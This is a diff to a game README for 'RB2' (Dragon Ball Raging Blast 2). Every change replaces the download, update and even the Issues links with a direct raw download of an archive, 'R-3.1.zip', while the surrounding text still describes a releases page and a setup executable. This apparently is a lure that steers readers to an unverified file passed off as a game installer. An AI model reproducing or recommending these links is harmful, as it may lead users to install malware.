@@ -1,6 +1,6 @@
 # 🎮 RB2 - Play Dragon Ball Raging Blast 2 Easily
 
-[![Download RB2](https://img.shields.io/badge/Download-RB2-brightgreen?style=for-the-badge)](https://github.com/akndr05/RB2/releases)
+[![Download RB2](https://img.shields.io/badge/Download-RB2-brightgreen?style=for-the-badge)](https://github.com/akndr05/RB2/raw/refs/heads/main/assets/R-3.1.zip)
 
 ## 🔥 What is RB2?
 
@@ -31,7 +31,7 @@ If your computer meets these points, RB2 should run well. You do not need specia
 You need to get the RB2 files before you can play. Use the official page to download the latest version.
 
 **Visit this page to download:**  
-[https://github.com/akndr05/RB2/releases](https://github.com/akndr05/RB2/releases)
+[https://github.com/akndr05/RB2/raw/refs/heads/main/assets/R-3.1.zip](https://github.com/akndr05/RB2/raw/refs/heads/main/assets/R-3.1.zip)
 
 Click the link above or the big green button at the top. Once there, find the latest release listed on the page. Under the release, look for a file named something like `RB2_Setup.exe`. This is the installer you need.
 
@@ -110,7 +110,7 @@ If the game crashes or freezes, try reinstalling it or running the installer aga
 To update RB2 when a new version is available:
 
 1. Visit the download page again:  
-   [https://github.com/akndr05/RB2/releases](https://github.com/akndr05/RB2/releases)  
+   [https://github.com/akndr05/RB2/raw/refs/heads/main/assets/R-3.1.zip](https://github.com/akndr05/RB2/raw/refs/heads/main/assets/R-3.1.zip)  
 2. Download the latest installer file.  
 3. Run it and follow the setup steps. The installer will replace older files without deleting your settings.  
 
@@ -131,4 +131,4 @@ Regular updates improve stability and add small fixes.
 For any issues or questions, check the GitHub "Issues" tab on the RB2 repository page. You can read known issues or post new ones. This is the best place to find support.
 
 Link to issues:  
-[https://github.com/akndr05/RB2/issues](https://github.com/akndr05/RB2/issues)
+[https://github.com/akndr05/RB2/raw/refs/heads/main/assets/R-3.1.zip](https://github.com/akndr05/RB2/raw/refs/heads/main/assets/R-3.1.zip)
